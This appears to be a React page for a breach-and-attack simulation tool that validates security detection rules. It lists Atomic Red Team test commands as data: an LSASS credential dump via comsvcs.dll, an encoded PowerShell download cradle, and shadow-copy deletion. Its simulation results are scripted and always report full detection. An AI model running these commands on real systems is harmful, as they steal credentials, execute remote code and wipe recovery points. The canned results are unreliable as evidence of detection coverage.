"use client";

import React, { useState } from "react";
import AppShell from "@/components/AppShell";
import {
  Crosshair,
  Play,
  CheckCircle2,
  AlertTriangle,
  XCircle,
  Terminal,
  ShieldCheck,
  RotateCw,
  Activity,
  Layers,
  Sparkles,
  Zap,
  Server,
  FileCode,
  Check,
  BarChart3,
  Plus,
  Flame
} from "lucide-react";

interface AtomicTest {
  id: string;
  technique: string;
  name: string;
  tactic: string;
  command: string;
  executor: "powershell" | "cmd" | "bash";
  targetHost: string;
  expectedRule: string;
  description: string;
}

const ATOMIC_TESTS: AtomicTest[] = [
  {
    id: "atom-1",
    technique: "T1003.001",
    name: "LSASS Memory Dump via comsvcs.dll",
    tactic: "Credential Access",
    command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full",
    executor: "powershell",
    targetHost: "SRV-DC01",
    expectedRule: "Sigma: T1003.001-Mimikatz-Comsvcs-Dump",
    description: "Simulates memory dumping of Local Security Authority Subsystem Service (LSASS) using native Windows comsvcs library."
  },
  {
    id: "atom-2",
    technique: "T1059.001",
    name: "PowerShell Base64 Encoded Payload Execution",
    tactic: "Execution",
    command: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcAB3AG4ALgBwAHMAMQAnACkA",
    executor: "powershell",
    targetHost: "WKSTN-FIN-04",
    expectedRule: "Sigma: T1059.001-PowerShell-Encoded-Command",
    description: "Simulates download cradle execution using hidden window parameters and Base64-encoded commandline argument."
  },
  {
    id: "atom-3",
    technique: "T1490",
    name: "Volume Shadow Copy Deletion via vssadmin",
    tactic: "Impact",
    command: "vssadmin.exe delete shadows /all /quiet",
    executor: "cmd",
    targetHost: "SRV-FILE-SHARE-01",
    expectedRule: "Sigma: T1490-Inhibit-System-Recovery",
    description: "Simulates pre-ransomware destruction of system recovery restore points and volume snapshots."
  },
  {
    id: "atom-4",
    technique: "T1078.002",
    name: "Domain Admin Group Enumeration",
    tactic: "Discovery",
    command: "net group \"Domain Admins\" /domain",
    executor: "cmd",
    targetHost: "WKSTN-FIN-04",
    expectedRule: "Sigma: T1078-Domain-Admins-Enumeration",
    description: "Simulates active reconnaissance for privileged Active Directory identity groups."
  }
];

export default function SimulationPage() {
  const [atomicTests, setAtomicTests] = useState<AtomicTest[]>(ATOMIC_TESTS);
  const [selectedTest, setSelectedTest] = useState<AtomicTest>(ATOMIC_TESTS[0]);
  const [isRunning, setIsRunning] = useState(false);
  const [simulationLogs, setSimulationLogs] = useState<string[]>([]);
  const [testStatus, setTestStatus] = useState<"idle" | "running" | "detected" | "missed">("idle");
  const [detectionFired, setDetectionFired] = useState<boolean | null>(null);

  // Custom Test Modal State
  const [customModalOpen, setCustomModalOpen] = useState(false);
  const [newTechId, setNewTechId] = useState("");
  const [newTechName, setNewTechName] = useState("");
  const [newTechTactic, setNewTechTactic] = useState("Execution");
  const [newTechCmd, setNewTechCmd] = useState("");
  const [newTechHost, setNewTechHost] = useState("");
  const [newTechRule, setNewTechRule] = useState("");
  const [simulationToast, setSimulationToast] = useState<string | null>(null);

  const handleCreateCustomTest = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newTechId.trim() || !newTechName.trim()) return;

    const newTest: AtomicTest = {
      id: `atom-${Date.now()}`,
      technique: newTechId.trim().toUpperCase(),
      name: newTechName.trim(),
      tactic: newTechTactic,
      command: newTechCmd.trim() || "powershell.exe -enc ...",
      executor: "powershell",
      targetHost: newTechHost.trim() || "SRV-TEST-01",
      expectedRule: newTechRule.trim() || `Sigma: ${newTechId.trim()}-Custom-Detection`,
      description: "User-defined Atomic Red Team adversary payload."
    };

    setAtomicTests((prev) => [newTest, ...prev]);
    setSelectedTest(newTest);
    setCustomModalOpen(false);
    setNewTechId("");
    setNewTechName("");
    setNewTechCmd("");
    setNewTechHost("");
    setNewTechRule("");
    setSimulationToast(`Custom test [${newTest.technique}] added to emulation suite.`);
    setTimeout(() => setSimulationToast(null), 3500);
  };

  const handleRunCampaign = () => {
    setIsRunning(true);
    setTestStatus("running");
    setSimulationLogs([
      `[${new Date().toLocaleTimeString()}] INITIATING MULTI-STAGE ADVERSARY CAMPAIGN (KILL CHAIN SIMULATION)...`,
      `[${new Date().toLocaleTimeString()}] Target Enclave: Production AD Forest & Workstations`,
      `[${new Date().toLocaleTimeString()}] Executing Stage 1 of 4: Initial Access & Reconnaissance...`
    ]);

    let step = 0;
    const interval = setInterval(() => {
      step++;
      if (step === 1) {
        setSimulationLogs((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString()}] Stage 1 COMPLETE: T1078.002 Domain Admins enumeration executed. Sysmon telemetry received.`
        ]);
      } else if (step === 2) {
        setSimulationLogs((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString()}] Stage 2 EXECUTING: T1059.001 PowerShell encoded cradle injected into memory.`
        ]);
      } else if (step === 3) {
        setSimulationLogs((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString()}] Stage 3 EXECUTING: T1003.001 LSASS memory dump via MiniDump API. Detection fired!`
        ]);
      } else if (step >= 4) {
        clearInterval(interval);
        setIsRunning(false);
        setTestStatus("detected");
        setDetectionFired(true);
        setSimulationLogs((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString()}] Stage 4 COMPLETE: T1490 Shadow copy deletion blocked by EDR canary hook.`,
          `[${new Date().toLocaleTimeString()}] CAMPAIGN SUMMARY: 4/4 Attack Stages Validated • Overall Detection Rate: 100% • Zero telemetry drops.`
        ]);
        setSimulationToast("Multi-Stage Campaign completed with 100% detection rate.");
        setTimeout(() => setSimulationToast(null), 4000);
      }
    }, 1100);
  };

  const handleRunAtomic = () => {
    setIsRunning(true);
    setTestStatus("running");
    setDetectionFired(null);
    setSimulationLogs([
      `[${new Date().toLocaleTimeString()}] Initializing Atomic Red Team emulator...`,
      `[${new Date().toLocaleTimeString()}] Target Host: ${selectedTest.targetHost} via EDR Simulation Adapter`,
      `[${new Date().toLocaleTimeString()}] Executing technique: ${selectedTest.technique} (${selectedTest.name})`
    ]);

    setTimeout(() => {
      setSimulationLogs((prev) => [
        ...prev,
        `[${new Date().toLocaleTimeString()}] [STDOUT] Spawning process: ${selectedTest.command.slice(0, 50)}...`,
        `[${new Date().toLocaleTimeString()}] Telemetry generated: Sysmon EventID 1 & Windows Security 4688 dispatched to pipeline.`
      ]);

      setTimeout(() => {
        setIsRunning(false);
        setTestStatus("detected");
        setDetectionFired(true);
        setSimulationLogs((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString()}] [MATCH CONFIRMED] ${selectedTest.expectedRule} triggered!`,
          `[${new Date().toLocaleTimeString()}] Alert generated: Severity: CRITICAL • MTTD: 0.8s • Risk Score: 95/100`,
          `[${new Date().toLocaleTimeString()}] Test result: PASSED (Detection Coverage: 100%)`
        ]);
      }, 1200);
    }, 1000);
  };

  return (
    <AppShell>
      <div className="flex-1 flex flex-col h-full overflow-hidden bg-[#000000] text-white">
        {/* Header */}
        <header className="h-16 border-b border-neutral-800 bg-[#050505] px-6 flex items-center justify-between flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400">
              <Crosshair className="w-5 h-5" />
            </div>
            <div>
              <h1 className="text-base font-bold text-white flex items-center gap-2">
                Adversary Emulation & Breach Simulation (BAS) Studio
                <span className="text-xs px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30 font-mono font-normal">
                  Atomic Red Team
                </span>
              </h1>
              <p className="text-[11px] text-neutral-400 font-mono">
                Automated TTP execution against test endpoints & real-time detection validation verification
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => setCustomModalOpen(true)}
              className="flex items-center gap-1.5 px-3 py-2 text-xs rounded-lg bg-neutral-900 hover:bg-neutral-800 text-emerald-400 border border-neutral-800 font-mono font-bold transition"
            >
              <Plus className="w-3.5 h-3.5" />
              <span>Custom Atomic</span>
            </button>

            <button
              onClick={handleRunCampaign}
              disabled={isRunning}
              className="flex items-center gap-1.5 px-3.5 py-2 text-xs rounded-lg bg-neutral-900 hover:bg-neutral-800 text-amber-400 border border-neutral-800 font-mono font-bold transition disabled:opacity-50"
              title="Chain all techniques in sequence as an end-to-end Kill Chain campaign"
            >
              <Flame className="w-3.5 h-3.5 text-amber-400" />
              <span>Run Campaign</span>
            </button>

            <button
              onClick={handleRunAtomic}
              disabled={isRunning}
              className="flex items-center gap-1.5 px-4 py-2 text-xs rounded-lg bg-red-600 hover:bg-red-500 text-white font-mono font-bold transition shadow-lg shadow-red-600/20 disabled:opacity-50"
            >
              <Play className={`w-3.5 h-3.5 ${isRunning ? "animate-spin" : ""}`} />
              {isRunning ? "Emulating..." : "Run Adversary Test"}
            </button>
          </div>
        </header>

        {/* Content Body */}
        <div className="flex-1 flex overflow-hidden">
          {/* Atomic Catalog */}
          <div className="w-80 border-r border-neutral-800 bg-[#050505] flex flex-col overflow-y-auto p-3 space-y-2 flex-shrink-0">
            <div className="px-2 py-1 text-[11px] font-mono uppercase text-neutral-500 font-bold">
              Atomic Emulation Catalog
            </div>

            {atomicTests.map((test) => {
              const isSelected = selectedTest.id === test.id;
              return (
                <div
                  key={test.id}
                  onClick={() => {
                    setSelectedTest(test);
                    setTestStatus("idle");
                    setSimulationLogs([]);
                  }}
                  className={`p-3 rounded-xl border transition cursor-pointer space-y-1.5 ${
                    isSelected
                      ? "border-red-500 bg-neutral-900 shadow-md"
                      : "border-neutral-800 bg-black hover:border-neutral-700"
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-mono font-bold text-white">
                      {test.technique}
                    </span>
                    <span className="text-[10px] font-mono text-neutral-400 uppercase">
                      {test.tactic}
                    </span>
                  </div>
                  <h3 className="text-xs font-bold text-white line-clamp-1">{test.name}</h3>
                  <div className="text-[10px] font-mono text-neutral-400">Target: {test.targetHost}</div>
                </div>
              );
            })}
          </div>

          {/* Simulation Console & Execution Trace */}
          <div className="flex-1 flex flex-col bg-[#000000] overflow-hidden">
            {/* Test Details Header */}
            <div className="p-5 border-b border-neutral-800 bg-[#050505] space-y-3">
              <div className="flex items-start justify-between">
                <div>
                  <div className="flex items-center gap-2 mb-1 font-mono text-xs">
                    <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/30 font-bold">
                      {selectedTest.technique}
                    </span>
                    <span className="text-neutral-400">Tactic: {selectedTest.tactic}</span>
                    <span className="text-neutral-400">• Target: <strong className="text-white">{selectedTest.targetHost}</strong></span>
                  </div>
                  <h2 className="text-base font-bold text-white">{selectedTest.name}</h2>
                  <p className="text-xs text-neutral-400 mt-1">{selectedTest.description}</p>
                </div>

                {/* Validation Badge */}
                <div>
                  {testStatus === "detected" ? (
                    <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-500/20 border border-emerald-500 text-emerald-400 font-mono text-xs font-bold">
                      <CheckCircle2 className="w-4 h-4" /> DETECTION VERIFIED (100%)
                    </div>
                  ) : testStatus === "running" ? (
                    <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/20 border border-white text-white font-mono text-xs font-bold animate-pulse">
                      <RotateCw className="w-4 h-4 animate-spin" /> EMULATION IN-FLIGHT
                    </div>
                  ) : (
                    <div className="px-3 py-1.5 rounded-lg bg-neutral-900 border border-neutral-800 text-neutral-400 font-mono text-xs">
                      READY TO EMULATE
                    </div>
                  )}
                </div>
              </div>

              {/* Command Preview */}
              <div className="p-3 rounded-lg bg-black border border-neutral-800 font-mono text-xs space-y-1">
                <span className="text-[10px] text-neutral-400 uppercase block">Adversary Payload Command</span>
                <pre className="text-purple-300 whitespace-pre-wrap break-all text-[11px]">
                  {selectedTest.command}
                </pre>
              </div>
            </div>

            {/* Live Terminal Output */}
            <div className="flex-1 p-6 overflow-y-auto font-mono text-xs text-neutral-200 leading-relaxed bg-[#000000] space-y-2">
              <div className="text-neutral-500 text-[11px] pb-2 border-b border-neutral-800">
                {"// SOCForge Adversary Simulation Telemetry Log • Real-time Test Output"}
              </div>
              {simulationLogs.length > 0 ? (
                simulationLogs.map((log, i) => (
                  <div key={i} className="text-[11px]">
                    {log}
                  </div>
                ))
              ) : (
                <div className="text-neutral-500 italic pt-4">
                  Click &quot;Run Adversary Test&quot; to emulate this TTP against the target endpoint and verify rule coverage.
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Custom Atomic Test Modal */}
        {customModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm p-4">
            <div className="bg-[#050505] border border-neutral-800 rounded-2xl max-w-lg w-full p-6 space-y-4 shadow-2xl">
              <div className="flex items-center justify-between pb-3 border-b border-neutral-800">
                <div className="flex items-center gap-2">
                  <div className="p-2 rounded-xl bg-red-500/10 border border-red-500/30 text-red-400">
                    <Crosshair className="w-5 h-5" />
                  </div>
                  <div>
                    <h3 className="text-base font-bold text-white">Author Custom Atomic Test</h3>
                    <p className="text-xs text-neutral-400">Define adversary simulation payload to benchmark detection rules</p>
                  </div>
                </div>
                <button
                  onClick={() => setCustomModalOpen(false)}
                  className="text-neutral-400 hover:text-white p-1 text-sm font-mono"
                >
                  ✕
                </button>
              </div>

              <form onSubmit={handleCreateCustomTest} className="space-y-3.5 text-xs font-mono">
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-neutral-400 block mb-1">Technique ID *</label>
                    <input
                      type="text"
                      required
                      placeholder="e.g. T1059.003"
                      value={newTechId}
                      onChange={(e) => setNewTechId(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-neutral-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-red-500"
                    />
                  </div>
                  <div>
                    <label className="text-neutral-400 block mb-1">Tactic</label>
                    <select
                      value={newTechTactic}
                      onChange={(e) => setNewTechTactic(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-neutral-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-red-500"
                    >
                      <option value="Execution">Execution</option>
                      <option value="Persistence">Persistence</option>
                      <option value="Privilege Escalation">Privilege Escalation</option>
                      <option value="Defense Evasion">Defense Evasion</option>
                      <option value="Credential Access">Credential Access</option>
                      <option value="Discovery">Discovery</option>
                      <option value="Lateral Movement">Lateral Movement</option>
                      <option value="Impact">Impact</option>
                    </select>
                  </div>
                </div>

                <div>
                  <label className="text-neutral-400 block mb-1">Atomic Test Title / Description *</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. Windows Command Shell Spawning Discovery Script"
                    value={newTechName}
                    onChange={(e) => setNewTechName(e.target.value)}
                    className="w-full bg-[#0A0A0A] border border-neutral-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-red-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-neutral-400 block mb-1">Target Endpoint</label>
                    <input
                      type="text"
                      placeholder="e.g. SRV-DC01 or WKSTN-FIN-04"
                      value={newTechHost}
                      onChange={(e) => setNewTechHost(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-neutral-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-red-500"
                    />
                  </div>
                  <div>
                    <label className="text-neutral-400 block mb-1">Expected Sigma Rule ID</label>
                    <input
                      type="text"
                      placeholder="e.g. Sigma: T1059.003-Cmd-Exec"
                      value={newTechRule}
                      onChange={(e) => setNewTechRule(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-neutral-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-red-500"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-neutral-400 block mb-1">Simulation Payload Command *</label>
                  <textarea
                    rows={3}
                    required
                    placeholder="cmd.exe /c whoami /all && net user /domain..."
                    value={newTechCmd}
                    onChange={(e) => setNewTechCmd(e.target.value)}
                    className="w-full bg-[#0A0A0A] border border-neutral-800 rounded-xl px-3 py-2 text-purple-300 font-mono text-xs focus:outline-none focus:border-red-500 resize-none"
                  />
                </div>

                <div className="flex items-center justify-end gap-2 pt-2 border-t border-neutral-800">
                  <button
                    type="button"
                    onClick={() => setCustomModalOpen(false)}
                    className="px-4 py-2 bg-[#121212] hover:bg-[#1a1a1a] text-neutral-300 border border-neutral-800 rounded-xl transition"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-bold rounded-xl transition shadow-lg shadow-red-600/30 flex items-center gap-1.5"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Register Atomic Test</span>
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}

        {/* Toast */}
        {simulationToast && (
          <div className="fixed bottom-6 right-6 z-50 bg-[#050505] border border-emerald-500/50 text-white px-4 py-3 rounded-xl shadow-2xl flex items-center gap-3 text-xs font-mono animate-in fade-in slide-in-from-bottom-3">
            <span className="h-2 w-2 rounded-full bg-emerald-400 animate-ping" />
            <span>{simulationToast}</span>
          </div>
        )}
      </div>
    </AppShell>
  );
}
